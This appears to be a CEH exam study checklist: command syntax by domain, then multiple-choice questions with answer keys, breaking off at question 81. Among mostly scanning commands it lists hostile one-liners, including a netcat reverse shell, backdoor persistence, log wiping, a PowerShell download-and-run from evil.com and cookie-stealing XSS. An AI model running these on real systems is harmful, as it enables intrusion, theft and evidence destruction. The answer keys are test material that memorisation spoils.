# CEH Study Material Review Checklist

---

## Section A — Commands & Tool Syntax

### Domain 1: Information Security and Ethical Hacking
1. `oscap xccdf eval --profile <profile> <benchmark>`

### Domain 2: Reconnaissance Techniques
1. `whois`
2. `nslookup`
3. `theHarvester`
4. `theHarvester -d target.com -b google`
5. `dig`
6. `site:target.com filetype:pdf`
7. `intitle:"index of"`
8. `inurl:admin`
9. `shodan host <IP>`
10. `inurl:`
11. `intitle:`
12. `cache:`
13. `https://sitereport.netcraft.com/?url=target.com`
14. `spiderfoot -s target.com`
15. `theHarvester -d target.com -b linkedin`
16. `wget`
17. `wget -r target.com`
18. `whatweb target.com`
19. `theHarvester -d domain.com -b all`
20. `whois target.com`
21. `whois example.com`
22. `nslookup -type=any target.com`
23. `dig axfr @ns-server target.com`
24. `dnsrecon -d target.com -t axfr`
25. `dig -t AXFR`
26. `dig axfr @ns1.target.com target.com`
27. `tracert`
28. `traceroute`
29. `whois -h whois.arin.net <IP>`
30. `traceroute -T -p 80 target.com`
31. `setoolkit`
32. `recon-ng`
33. `FOCA.exe`
34. `spiderfoot -s target.com`
35. `nmap -sS -p 1-1000 192.168.1.0/24`
36. `hping3 -S -p 80 10.0.0.1`
37. `-sT`
38. `-sS`
39. `-sU`
40. `nmap -sS -p 22,80,443 10.10.10.5`
41. `22/tcp open`
42. `80/tcp filtered`
43. `443/tcp closed`
44. `nmap -sV -O 192.168.1.1`
45. `nc -nv 10.0.0.1 80`
46. `HEAD / HTTP/1.0`
47. `hping3 -S -p 80 --flood target`
48. `masscan -p80,443 10.0.0.0/8 --rate=10000`
49. `-sS`
50. `-sT`
51. `-sU`
52. `-sV`
53. `-O`
54. `-Pn`
55. `-p`
56. `--script`
57. `--script=http-headers`
58. `nmap -sU -F 192.168.1.1`
59. `nmap -sS -Pn 192.168.1.1`
60. `nmap -sT -p 1-100 192.168.1.1`
61. `nmap -sU -Pn --top-ports 100 192.168.1.1`
62. `-sn`
63. `nmap -sn 192.168.1.0/24`
64. `arp-scan --localnet`
65. `fping -g 192.168.1.0/24`
66. `-Pn`
67. `-PS`
68. `-PR`
69. `nmap -sP 192.168.1.0/24`
70. `nmap -Pn 192.168.1.0/24`
71. `nmap -sn -PR 192.168.1.0/24`
72. `nmap -sn -PS 192.168.1.0/24`
73. `nmap -sV -p 21,22,80 10.0.0.1`
74. `--script=banner`
75. `nc -v target 22`
76. `amap -b 10.0.0.1 80`
77. `-sV --version-intensity 0-9`
78. `-A`
79. `nslookup 8080`
80. `tracert -p 8080`
81. `telnet 10.0.0.1 8080`
82. `HEAD / HTTP/1.0`
83. `ping 8080`
84. `nmap -O 10.0.0.1`
85. `p0f -i eth0`
86. `nc 10.0.0.1 22`
87. `-O`
88. `nmap -O 192.168.1.100`
89. `-f`
90. `--mtu`
91. `-D decoy1,decoy2,ME`
92. `-sI zombie_ip`
93. `-T0`
94. `-T5`
95. `--source-port 53`
96. `--data-length`
97. `nmap -D 10.0.0.50 10.10.10.10`
98. `nmap -sS 10.0.0.50`
99. `nmap -sI 10.0.0.50 10.10.10.10`
100. `nmap -sA 10.10.10.10`
101. `-sI`
102. `iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP`
103. `alert tcp any any -> any 80 (msg:"SYN scan"; flags:S; threshold: type both, track by_src, count 20, seconds 5;)`
104. `enum4linux -U -S target`
105. `smbclient -L //target -N`
106. `nmap --script=smb-enum-shares,smb-enum-users -p445 target`
107. `snmpwalk -c public -v1 target`
108. `ldapsearch -x -h target -b "dc=domain,dc=com"`
109. `nbtstat -A 192.168.1.10`
110. `net view \\192.168.1.10`
111. `nmap -sU -p 137 --script nbstat.nse target`
112. `nbtstat -a <name>`
113. `-A <IP>`
114. `nbtstat -A 10.0.0.5`
115. `<00>`
116. `<20>`
117. `<03>`
118. `snmpwalk -c public -v1 10.0.0.1`
119. `snmp-check 10.0.0.1 -c public`
120. `nmap -sU -p 161 --script=snmp* 10.0.0.1`
121. `public`
122. `private`
123. `nmap -sU -p 161 --script snmp-info`
124. `ldapsearch -x -h 10.0.0.1 -b "dc=example,dc=com"`
125. `nmap -p 389 --script ldap-search --script-args 'ldap.base="dc=example,dc=com"'`
126. `ldapsearch -x -h 10.1.1.5 -b "dc=internal,dc=corp"`
127. `-x`
128. `ntpq -c monlist <target>`
129. `showmount -e 10.0.0.1`
130. `mount -t nfs 10.0.0.1:/exported /mnt`
131. `nmap -sU -p 123 --script ntp-monlist`
132. `nmap -p 2049 --script nfs-showmount`
133. `showmount -e 192.168.1.100`
134. `nc -nv 10.0.0.1 25`
135. `VRFY`
136. `EXPN`
137. `smtp-user-enum -M VRFY -u root -t 10.0.0.1`
138. `dnsrecon -d example.com -t axfr`
139. `dnsenum example.com`
140. `dig +norecurse @ns A target.com`
141. `ike-scan -M 10.0.0.1`
142. `svmap 10.0.0.0/24`
143. `rpcinfo -p 10.0.0.1`
144. `nmap -sR`
145. `finger @10.0.0.1`
146. `finger -l root@target`
147. `rpcinfo -p 192.168.1.50`
148. `iptables -A INPUT -p tcp --dport 139 -j DROP`

### Domain 3: System Hacking
1. `nessuscli scan new`
2. `gvm-cli --create-task`
3. `nikto -h http://target.com`
4. `--script vuln`
5. `nessuscli scan new --name "MyScan" --target 192.168.1.1`
6. `gvm-cli socket --xml "<create_task>...</create_task>"`
7. `nikto -h 10.0.0.1 -p 80`
8. `use exploit/windows/smb/ms17_010_eternalblue`
9. `hydra -l admin -P pass.txt 192.168.1.1 ssh`
10. `nc victim_ip 1234 -e /bin/sh`
11. `crackmapexec smb target -u users.txt -p Password1`
12. `sekurlsa::logonpasswords`
13. `hashcat -m 1000 hashes.txt rockyou.txt`
14. `john --format=NT hashes.txt`
15. `hydra -l admin -P list.txt ssh://target`
16. `cewl target.com`
17. `search struts2`
18. `use exploit/multi/http/struts2_content_type_ognl`
19. `set RHOSTS`
20. `exploit`
21. `searchsploit apache 2.4`
22. `use auxiliary/scanner/portscan`
23. `show exploits`
24. `search name:Microsoft`
25. `setg RHOSTS`
26. `Invoke-AllChecks`
27. `getsystem`
28. `whoami /priv`
29. `run persistence -U -i 10 -p 4444 -r attacker_IP`
30. `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\backdoor.exe`
31. `nc -lvp 4444 -e cmd.exe`
32. `~/.ssh/authorized_keys`
33. `upload /path/to/malware.exe C:\\Windows\\Temp`
34. `execute -f malware.exe`
35. `psexec \\target -u admin -p pass cmd`
36. `powershell -ExecutionPolicy Bypass -File evil.ps1`
37. `type calc.exe > readme.txt:calc.exe`
38. `start .\readme.txt:calc.exe`
39. `steghide embed -cf image.jpg -ef secret.txt`
40. `mv malware .malware`
41. `dir /r`
42. `run persistence -X`
43. `schtasks /create /tn "Update" /tr C:\temp\backdoor.exe /sc hourly`
44. `reg add HKLM\...\Run /v "Updater" /d C:\backdoor.exe`
45. `crontab -e`
46. `*/10 * * * * /tmp/backdoor`
47. `HKLM\System\CurrentControlSet\Services`
48. `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
49. `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
50. `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
51. `wevtutil cl System`
52. `wevtutil cl Security`
53. `Clear-EventLog -LogName Security`
54. `clearev`
55. `shred -zu /var/log/*`
56. `rm -rf /var/log`
57. `history -c`
58. `timestomp`
59. `netstat -ano`
60. `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"`
61. `execute-assembly`
62. `strings malware.exe`
63. `objdump -d malware`
64. `strings`
65. `MpCmdRun -Scan -ScanType 2`
66. `MpCmdRun -Scan -ScanType 1`
67. `clamscan -r /home`

### Domain 4: Network and Perimeter Hacking
1. `capture filter host 192.168.1.5`
2. `tcpdump -i eth0 host 10.0.0.1`
3. `macof -i eth0 -s 192.168.1.100`
4. `switchport port-security maximum 1`
5. `switchport port-security violation shutdown`
6. `yersinia -I interactive`
7. `arpspoof -i eth0 -t 192.168.1.5 192.168.1.1`
8. `bettercap -T 192.168.1.5 --arp-spoof`
9. `ettercap -T -M arp /target// /gateway//`
10. `ifconfig eth0 hw ether 00:11:22:33:44:55`
11. `hping3 -a spoofedIP target`
12. `dnsspoof -i eth0 -f hosts.txt`
13. `dns.spoof`
14. `filter http.request.method == "POST"`
15. `tcpdump -i eth0 port 80 -A`
16. `net.sniff on`
17. `nmap -sS -p 80 target`
18. `ping target`
19. `tcpdump -i eth0 port 80 -w http.pcap`
20. `netstat -an`
21. `ip arp inspection vlan 10`
22. `switchport port-security`
23. `nmap --script sniffer-detect <target>`
24. `nmap --script=sniffer-detect 10.0.0.5`
25. `setoolkit`
26. `<script>new Image().src="http://attacker/cookie.php?c="+document.cookie</script>`
27. `hping3 --flood -S -p 80 target`
28. `stats`
29. `iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT`
30. `set http.proxy.sslstrip true`
31. `http.proxy on`
32. `ferret -i eth0`
33. `hamster`
34. `Header always set Strict-Transport-Security "max-age=31536000"`
35. `session_regenerate_id(true)`
36. `snort -i eth0 -c snort.conf`
37. `alert tcp any any -> any 80 (msg:"Attack"; content:"/etc/passwd";)`
38. `-f`
39. `msfvenom -e x86/shikata_ga_nai`
40. `--source-port 53`
41. `proxychains nmap -sT target`
42. `--data-length`
43. `--mtu`

### Domain 5: Web Application Hacking
1. `nmap -sV -p 80,443 target`
2. `nc target 80`
3. `whatweb target`
4. `C:\Inetpub\wwwroot`
5. `/var/www/html`
6. `java -jar DirBuster.jar`
7. `nikto -h target`
8. `../`
9. `%c0%af`
10. `GET /../../../../etc/passwd HTTP/1.1`
11. `nmap -sV -p 3306 target`
12. `dnsrecon -d target.com -t axfr`
13. `gobuster dir -u http://target.com -w wordlist.txt`
14. `price=100`
15. `price=1`
16. `hydra -L users.txt -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`
17. `admin'--`
18. `/profile/123`
19. `/profile/124`
20. `;`
21. `|`
22. `&&`
23. `' OR 1=1 --`
24. `*`
25. `admin)(&`
26. `<script>alert(1)</script>`
27. `<!-- connection string: server=db01; uid=admin; pwd=password -->`
28. `<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>`
29. `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
30. `weevely generate password shell.php`
31. `X-Content-Type-Options: nosniff`
32. `Content-Security-Policy`
33. `sqlmap -u "http://target/page?id=1" --dbs`
34. `'`
35. `' OR 1=1 --`
36. `' UNION SELECT 1,2,3--`
37. `' WAITFOR DELAY '0:0:5'--`
38. `' AND (SELECT IF(1=1, SLEEP(5), 0))--`
39. `SLEEP()`
40. `pg_sleep()`
41. `WAITFOR DELAY`
42. `?id=1 ORDER BY 10--`
43. `?id=1 ORDER BY 5--`
44. `ORDER BY`
45. `sqlmap -u target --current-db`
46. `--dbs`
47. `--tables`
48. `--columns`
49. `--dump`
50. `--os-shell`
51. `--os-pwn`
52. `--user-agent`
53. `sqlmap -u target --passwords`
54. `sqlmap -u target --dbs`
55. `sqlmap -u target --tables`
56. `sqlmap -u target --os-shell`
57. `--tamper=between,space2comment,charencode`
58. `SELECT * FROM users WHERE id=1 UNION%a0SELECT 1,2`
59. `0x61646d696e`
60. `%27`
61. `%00`
62. `/*!50000UNION*/ SELECT`
63. `http-soap-methods`
64. `mysql_real_escape_string`

### Domain 6: Wireless Network Hacking
1. `aircrack-ng`
2. `airolib-ng`
3. `Reaver`
4. `aireplay-ng --deauth`
5. `airmon-ng`
6. `airodump-ng`
7. `aireplay-ng`
8. `airmon-ng start wlan0`

### Domain 7: Mobile, IoT, and OT Hacking
1. `adb shell`
2. `android/meterpreter/reverse_tcp`
3. `dz> run app.package.list`
4. `adb connect IP`
5. `adb connect 192.168.1.10`
6. `mobsf.py upload APK`
7. `frida -U -f com.app.name`
8. `modbus-discover`

### Domain 8: Cloud Computing
1. `docker run`
2. `/var/run/docker.sock`
3. `169.254.169.254`
4. `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

### Domain 9: Cryptography
1. `openssl enc -aes-256-cbc -in file`
2. `gpg -c file`
3. `sha256sum`
4. `openssl speed`
5. `openssl req -new -x509 -keyout key.pem`
6. `gpg --gen-key`
7. `gpg --encrypt --recipient user@example.com file`
8. `manage-bde -on C:`
9. `cryptsetup luksFormat /dev/sda1`
10. `SSLCipherSuite`

---

## Section B — All MCQ Answer Keys

### Domain 1: Information Security and Ethical Hacking
1. A company's database is encrypted and backed up daily. An attacker deletes the live data, but it is restored within minutes. Which security property was temporarily lost?
   - A) Availability  B) Integrity  C) Non-repudiation  D) Confidentiality
   - **Answer: A**

2. An ethical hacker completes network scanning and obtains a shell on the target. According to CEH's hacking methodology, which phase comes next?
   - A) Reporting  B) Reconnaissance  C) Clearing Tracks  D) Maintaining Access
   - **Answer: D**

3. An attacker discovers a SQL injection flaw in a web app and writes a script to extract user data. The SQL injection flaw is an example of a:
   - A) Vulnerability  B) Risk  C) Exploit  D) Threat
   - **Answer: A**

4. A pen tester is hired to assess network security. The tester launches an attack that crashes the production server, causing outage. Legally, the tester is protected because:
   - A) The tester had a written agreement and authorization  B) The attack was in the scope  C) The tester acted ethically  D) The tester followed OSSTMM
   - **Answer: A**

5. A company installs a security camera at the server room entrance. This camera is primarily which type of control?
   - A) Detective  B) Deterrent  C) Corrective  D) Preventive
   - **Answer: A**

6. A healthcare provider's database containing patient medical records is breached. Which regulation was primarily violated?
   - A) PCI DSS  B) SOX  C) HIPAA  D) GDPR
   - **Answer: C**

### Domain 2: Reconnaissance Techniques
7. A penetration tester collects employee email addresses from Google, LinkedIn, and company website without sending any packets to the company's network. This activity is:
   - A) Scanning  B) Passive footprinting  C) Active footprinting  D) Enumeration
   - **Answer: B**

8. According to the CEH footprinting methodology, after performing Whois lookup, what is the immediate next step?
   - A) DNS footprinting  B) Email footprinting  C) Footprinting through social networking sites  D) Network footprinting
   - **Answer: A**

9. An attacker searches for `"site:example.com intitle:'index of' 'backup.sql'"`. What is the attacker looking for?
   - A) SQL injection vulnerabilities  B) WordPress admin panel  C) Directory listing of backup database files  D) DNS zone transfer
   - **Answer: C**

10. An organization removed its "/partners" login page after a security review. An attacker uses what service to potentially view the removed page?
    - A) The Wayback Machine  B) Google Dorking  C) Shodan  D) Netcraft
    - **Answer: A**

11. A hacker searches LinkedIn for employees at a company and finds a network engineer listing his CCNA certification. How can the attacker exploit this?
    - A) Password cracking  B) DNS zone transfer  C) ARP poisoning  D) Spear-phishing with a Cisco-themed email
    - **Answer: D**

12. A penetration tester finds the line `<!-- connection string: server=db01; uid=admin; pwd=password -->` in a web page source. What should the organization do?
    - A) Use HTTPS  B) Implement CAPTCHA  C) Disable directory listing  D) Delete the comment and change credentials
    - **Answer: D**

13. An attacker receives an email from target.com and examines the header: `"Received: from mail.internal.target.com ([192.168.10.25])"`. What information can be inferred?
    - A) The email was encrypted  B) Internal hostname and private IP address  C) The email is a phishing attempt  D) The email server is vulnerable to relay
    - **Answer: B**

14. An ethical hacker runs `whois example.com` and gets no registrant email but sees "ns1.example.com" and "ns2.example.com". What can still be done?
    - A) Contact the registrar for the email  B) Report to law enforcement  C) Use the DNS servers for DNS footprinting  D) No further action possible
    - **Answer: C**

15. A penetration tester runs `dig axfr @ns1.target.com target.com` and receives a list of all hostnames and IP addresses. This indicates:
    - A) The DNS server is poisoned  B) Zone transfer is allowed  C) DNS cache snooping is enabled  D) The server is patched
    - **Answer: B**

16. A target network blocks ICMP packets. How can an attacker still perform a traceroute to discover network hops?
    - A) Use ARP requests  B) Use UDP traceroute  C) Use DNS zone transfer  D) Use TCP traceroute on port 80
    - **Answer: D**

17. An attacker calls an employee, claiming to be from the IT help desk, and asks for the employee's username and password to "fix an account issue." This is an example of:
    - A) Pretexting  B) Dumpster diving  C) Shoulder surfing  D) Tailgating
    - **Answer: A**

18. A security analyst wants to automatically gather email addresses, employee names, and subdomains from multiple search engines. Which tool is best suited?
    - A) Wireshark  B) John the Ripper  C) Nmap  D) theHarvester
    - **Answer: D**

19. Which is the best defense against an attacker using theHarvester to collect corporate email addresses?
    - A) Use strong passwords  B) Restrict email addresses published on public websites and social media  C) Implement a firewall  D) Disable ICMP
    - **Answer: B**

20. A security analyst runs `nmap -sS -p 22,80,443 10.10.10.5` and sees: `22/tcp open`, `80/tcp filtered`, `443/tcp closed`. What does "filtered" indicate?
    - A) The port is open but firewall blocks access to the scanner  B) The service is disabled  C) Nmap cannot determine if the port is open because no response was received  D) The host is down
    - **Answer: C**

21. To perform a UDP scan on the top 100 ports and avoid sending any ICMP ping, which Nmap command should be used?
    - A) `nmap -sU -F 192.168.1.1`  B) `nmap -sS -Pn 192.168.1.1`  C) `nmap -sT -p 1-100 192.168.1.1`  D) `nmap -sU -Pn --top-ports 100 192.168.1.1`
    - **Answer: D**

22. An internal penetration tester wants to discover all live hosts on the local Ethernet without sending any IP packets. Which Nmap option is best?
    - A) `nmap -sP 192.168.1.0/24`  B) `nmap -Pn 192.168.1.0/24`  C) `nmap -sn -PR 192.168.1.0/24`  D) `nmap -sn -PS 192.168.1.0/24`
    - **Answer: C**

23. An Nmap scan shows port 8080 as open with "http-proxy" service. To manually verify, what command would an attacker likely use?
    - A) `nslookup 8080`  B) `tracert -p 8080`  C) `telnet 10.0.0.1 8080` then `HEAD / HTTP/1.0`  D) `ping 8080`
    - **Answer: C**

24. A security analyst runs `nmap -O 192.168.1.100` and gets: "OS details: Linux 2.6.32 -- 3.10". The scan also shows port 22/tcp open and 23/tcp closed. Why did it succeed?
    - A) Because the host responded to ICMP  B) Because the target runs Linux  C) Because port 23 was open  D) Because at least one open and one closed port were found
    - **Answer: D**

25. An attacker wants to scan a target without revealing his own IP. He identifies a zombie host 10.0.0.50 with predictable IP IDs. Which Nmap scan accomplishes this?
    - A) `nmap -D 10.0.0.50 10.10.10.10`  B) `nmap -sS 10.0.0.50`  C) `nmap -sI 10.0.0.50 10.10.10.10`  D) `nmap -sA 10.10.10.10`
    - **Answer: C**

26. Which firewall rule would best thwart a TCP NULL scan?
    - A) Drop all ICMP echo requests  B) Drop SYN packets  C) Allow all TCP traffic  D) Drop packets with no TCP flags set
    - **Answer: D**

27. An attacker establishes a null session to a target's port 445 and lists user accounts. Which service was exploited?
    - A) Telnet  B) SMB  C) LDAP  D) SNMP
    - **Answer: B**

28. An attacker runs `nbtstat -A 10.0.0.5` and sees `<00> UNIQUE`, `<20> UNIQUE`, `<03> UNIQUE`. What can be concluded?
    - A) The system is a file server with a user logged in  B) The system has port 445 closed  C) The system is a domain controller  D) The system is a Linux machine
    - **Answer: A**

29. A penetration tester scans the target with `nmap -sU -p 161 --script snmp-info` and finds a device with community string "public". What risk does this pose?
    - A) A denial-of-service can be launched  B) Configuration and sensitive data can be read  C) The device can be rebooted  D) Passwords can be changed
    - **Answer: B**

30. An auditor finds that the command `ldapsearch -x -h 10.1.1.5 -b "dc=internal,dc=corp"` returns a list of all users without prompting for credentials. What is the issue?
    - A) Weak password policy  B) Anonymous LDAP bind is enabled  C) Missing firewall rule  D) Open SSH port
    - **Answer: B**

31. An attacker runs `showmount -e 192.168.1.100` and sees `/data *`. What does the asterisk mean?
    - A) The share requires authentication  B) The share is encrypted  C) The share is a pseudo file system  D) The share is accessible to any host
    - **Answer: D**

32. A penetration tester connects to port 25 and issues "EXPN admin". What information does this attempt to retrieve?
    - A) Verify if admin user exists  B) Retrieve server version  C) Test for open relay  D) List email addresses of members in the admin mailing list
    - **Answer: D**

33. An attacker runs `rpcinfo -p 192.168.1.50` and sees program 100005 version 1 (mountd). What can be inferred?
    - A) The host is a domain controller  B) The host is running NFS and mountd is available  C) The host has a web server  D) The host is a database server
    - **Answer: B**

34. Which configuration change best prevents an attacker from using null sessions to enumerate users on a Windows server?
    - A) Set RestrictAnonymous registry key to 1  B) Disable ICMP  C) Disable port 445  D) Use SNMPv3
    - **Answer: A**

### Domain 3: System Hacking
35. A security team runs a Nessus scan and receives a report listing CVSS scores for each finding. What does the CVSS score represent?
    - A) The severity of the vulnerability  B) The exploitability index  C) The vendor's patch priority  D) The network criticality
    - **Answer: A**

36. An auditor wants to detect missing security patches on 100 Windows servers. Which assessment approach yields the most reliable results?
    - A) Credentialed scan with local admin rights  B) Social engineering test  C) Phishing simulation  D) Unauthenticated network scan
    - **Answer: A**

37. Which vulnerability assessment tool is specifically designed to test web servers for dangerous files and misconfigurations?
    - A) OpenVAS  B) Nessus  C) Nikto  D) Wireshark
    - **Answer: C**

38. A vulnerability report identifies a critical remote code execution flaw with a CVSS of 9.8. What is the best first action for the recipient?
    - A) Disable the server's firewall  B) Shut down the server permanently  C) Immediately apply the vendor patch or mitigation  D) Ignore it if the server is not internet-facing
    - **Answer: C**

39. An attacker has a limited user shell on a Linux box. Which action is part of the "Escalating Privileges" phase?
    - A) Running a kernel exploit to gain root  B) Cracking the root password using John the Ripper  C) Deleting the bash history  D) Installing a keylogger
    - **Answer: A**

40. An attacker exploits a web application's file upload vulnerability to upload a PHP web shell, then navigates to the shell URL and executes commands. Which phase of system hacking just occurred?
    - A) Clearing tracks  B) Gaining access  C) Maintaining access  D) Privilege escalation
    - **Answer: B**

41. A security analyst obtains an NTLM hash "B4B9B02E6F09A9BD760F388B67351E2B". Which tool can most efficiently crack it with a precomputed table?
    - A) Wireshark  B) RainbowCrack  C) Hydra  D) Netcat
    - **Answer: B**

42. In Metasploit, which command would you use to list all available exploits for a specific vendor?
    - A) `use auxiliary/scanner/portscan`  B) `show exploits`  C) `search name:Microsoft`  D) `setg RHOSTS`
    - **Answer: C**

43. A hacker has a low-privilege shell on a Windows 10 machine and runs `whoami /priv` to see SeImpersonatePrivilege enabled. What attack is most suitable?
    - A) SQL injection  B) Pass the hash  C) Potato attack (Juicy/Rotten)  D) DLL hijacking
    - **Answer: C**

44. A penetration tester successfully gains SYSTEM access on a server and wants to maintain access without detection. Which method is stealthiest?
    - A) Open a port in firewall  B) Install a new Windows service with a misleading name  C) Create a new domain admin account  D) Add a cron job calling back to a C2 server using HTTPS
    - **Answer: D**

45. An attacker wants to run a malicious binary on a compromised Windows target without leaving it on disk. Which technique is most appropriate?
    - A) Copy the exe to startup folder  B) Fileless execution using PowerShell to reflectively load the binary in memory  C) Install as a service  D) Schedule a task to run the exe
    - **Answer: B**

46. A suspect's machine has a file picture.jpg. Forensic analysis reveals hidden data within it using steghide. What technique was used?
    - A) Rootkit  B) Alternate Data Streams  C) Encryption  D) Steganography
    - **Answer: D**

47. Which Windows registry key is commonly used for per-machine persistence that runs a program at every logon for any user?
    - A) `HKLM\System\CurrentControlSet\Services`  B) `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`  C) `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`  D) `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
    - **Answer: B**

48. An attacker uses Meterpreter and types `clearev`. What is the effect?
    - A) Deletes all files in the current directory  B) Removes the attacker's user account  C) Clears the Windows Application, System, and Security event logs  D) Disables Windows Firewall
    - **Answer: C**

49. A malicious program spreads automatically by exploiting a vulnerability in SMB, without any user action. This program is classified as:
    - A) Adware  B) Virus  C) Worm  D) Trojan
    - **Answer: C**

50. A government agency discovers that a sophisticated attacker has been exfiltrating classified documents for 18 months using custom malware that evaded standard antivirus. This is an example of:
    - A) An advanced persistent threat  B) A DDoS attack  C) A phishing campaign  D) A script kiddie attack
    - **Answer: A**

51. A suspicious process on a Windows host connects to a remote IP on port 31337. This port is commonly associated with which trojan?
    - A) Beast  B) Back Orifice  C) SubSeven  D) NetBus
    - **Answer: B**

52. A malware that infects the boot sector of a hard drive and executable files is classified as:
    - A) Multipartite virus  B) Worm  C) Macro virus  D) Polymorphic virus
    - **Answer: A**

53. A security tool detects a PowerShell process making a network connection to a known malicious IP, but no new files are found on disk. What type of attack is likely occurring?
    - A) Trojan  B) Rootkit  C) Worm  D) Fileless malware
    - **Answer: D**

54. An analyst uses `strings` on a suspicious binary but sees very few readable strings and notices the .text section has high entropy. What does this indicate?
    - A) The binary is clean  B) The binary is a text file  C) The binary is 64-bit  D) The binary is likely packed or encrypted
    - **Answer: D**

55. Which configuration best prevents a macro virus from executing in a corporate environment?
    - A) Use strong passwords  B) Install antivirus  C) Block port 25  D) Disable all macros in Office documents, enable only with notification or digital signatures
    - **Answer: D**

56. A new ransomware variant not in any antivirus database encrypts files on an endpoint with EDR. The EDR detects the activity because it monitors the rate of file modifications and blocks the process. This type of detection is:
    - A) Signature-based  B) Firewall rule  C) Heuristic/behavioral  D) DNS filtering
    - **Answer: C**

### Domain 4: Network and Perimeter Hacking
57. On which type of network device can a sniffer capture all traffic simply by being plugged in, without any attack?
    - A) Switch  B) Hub  C) Router  D) Firewall
    - **Answer: B**

58. An attacker runs macof on a switched network and subsequently captures traffic belonging to the victim's machine. What is the most likely explanation?
    - A) The CAM table overflowed, causing the switch to flood frames  B) The attacker changed his MAC to the victim's  C) The switch is running STP  D) The attacker performed a DHCP attack
    - **Answer: A**

59. An organization implements DHCP snooping on its switches. After configuration, clients can no longer obtain IP addresses from the legitimate server. What is the likely issue?
    - A) DNS is down  B) STP blocking  C) MAC flooding is occurring  D) The legitimate DHCP server port is not configured as trusted
    - **Answer: D**

60. A network admin sees a warning from ARPwatch that the MAC address for 192.168.1.1 changed from AA:BB:CC:11:22:33 to 00:0C:29:AB:CD:EF. What is the most likely attack?
    - A) MAC flooding  B) DNS poisoning  C) DHCP starvation  D) ARP poisoning
    - **Answer: D**

61. A firewall rule blocks traffic from IP 10.0.0.50. An attacker changes his machine's IP to 10.0.0.51 and successfully connects. What type of attack is this?
    - A) IP spoofing  B) ARP spoofing  C) DNS spoofing  D) MAC spoofing
    - **Answer: A**

62. An attacker on a local network sends a crafted DNS reply to a victim that resolves www.google.com to 192.168.1.100. Which attack technique is this?
    - A) DNS tunneling  B) DNS amplification  C) DNS cache poisoning  D) DNS spoofing
    - **Answer: D**

63. A security auditor wants to capture all HTTP traffic to a file for later analysis, with minimal CPU. Which command is best?
    - A) `nmap -sS -p 80 target`  B) `ping target`  C) `tcpdump -i eth0 port 80 -w http.pcap`  D) `netstat -an`
    - **Answer: C**

64. Which Cisco switch feature can prevent ARP spoofing by checking ARP packets against a trusted database?
    - A) Port security  B) DHCP snooping  C) BPDU guard  D) Dynamic ARP Inspection
    - **Answer: D**

65. An administrator suspects a host is sniffing. She runs `nmap --script=sniffer-detect 10.0.0.5` and gets "Likely in promiscuous mode". What does this indicate?
    - A) The host is a router  B) The host is definitely a sniffer  C) The host is compromised  D) The host's NIC is likely accepting all frames, not just its own
    - **Answer: D**

66. An attacker researches a target company's hierarchy, then calls an employee pretending to be the CEO demanding a password reset. Which phase is the attacker in when making the call?
    - A) Development of trust  B) Exploitation  C) Research  D) Exit
    - **Answer: B**

67. An attacker leaves USB drives labeled "Salary Report 2024" in the company parking lot. Employees find them and plug them in. This technique is:
    - A) Baiting  B) Vishing  C) Spear phishing  D) Pretexting
    - **Answer: A**

68. A database administrator downloads the entire customer database to a personal cloud drive right after receiving a negative performance review. This is an example of:
    - A) DDoS  B) Malicious insider threat  C) Accidental data loss  D) Spear phishing
    - **Answer: B**

69. A user receives a friend request from a profile using the name and picture of an existing friend. The new profile asks about project details. What attack is this?
    - A) Whaling  B) Keylogging  C) Social media account cloning  D) DNS spoofing
    - **Answer: C**

70. A criminal uses a victim's name, SSN, and date of birth to obtain a credit card. This type of identity theft is known as:
    - A) True name identity theft  B) Account takeover  C) Phishing  D) Pretexting
    - **Answer: A**

71. Which is the single most effective way to reduce the risk of a successful social engineering attack?
    - A) Deploy a firewall  B) Conduct regular security awareness training  C) Use strong encryption  D) Install antivirus
    - **Answer: B**

72. An attacker sends thousands of TCP SYN packets with spoofed source IPs to a web server, never completing the handshake. What type of attack is this?
    - A) HTTP flood  B) Ping of Death  C) SYN flood  D) Smurf attack
    - **Answer: C**

73. Thousands of IP cameras with default passwords are exploited and start sending HTTP requests to a target website, causing downtime. This botnet likely resembles:
    - A) WannaCry  B) Stuxnet  C) Zeus  D) Mirai
    - **Answer: D**

74. An attacker sends ICMP echo requests to the network broadcast address of 10.0.0.0/24, spoofing the source IP of the victim. All hosts reply to the victim. This is a:
    - A) Fraggle attack  B) SYN flood  C) DNS amplification  D) Smurf attack
    - **Answer: D**

75. In 2018, a DDoS attack peaked at 1.35 Tbps by exploiting publicly accessible Memcached servers. What made the amplification factor so high?
    - A) DNS zone transfer  B) TCP three-way handshake  C) Small request generated a huge response (up to 51,200x)  D) ARP spoofing
    - **Answer: C**

76. Which technique can protect a server from SYN flood attacks without dropping legitimate connections?
    - A) Block all ICMP  B) Close port 80  C) Disable TCP  D) SYN cookies
    - **Answer: D**

77. An organization wants to defend against volumetric DDoS attacks without investing in hardware. Which solution is best?
    - A) Cloud-based DDoS scrubbing service  B) Install antivirus  C) Upgrade server CPU  D) On-premise IPS
    - **Answer: A**

78. An attacker sets up a rogue access point, and a victim connects and logs into an HTTP site. The attacker captures the session cookie and uses it to access the site. What type of attack?
    - A) Session hijacking (sidejacking)  B) SQL injection  C) Cross-site request forgery  D) Session fixation
    - **Answer: A**

79. A web application does not issue a new session ID after user authentication. An attacker logs in with a predetermined session ID and sends the same URL to a victim, who logs in. The attacker then uses that session ID. This is:
    - A) Session sniffing  B) Session donation  C) Session fixation  D) CSRF
    - **Answer: C**

80. An attacker uses a tool to inject a command into an existing Telnet session between a user and a server, without disrupting the connection. What technique is this?
    - A) DNS poisoning  B) ARP poisoning  C) ICMP tunneling  D) TCP session hijacking
    - **Answer: D**

81. A penetration tester uses a tool that captures HTTP cookies from a wireless network and then launches a browser-based proxy to reuse them. Which toolset?
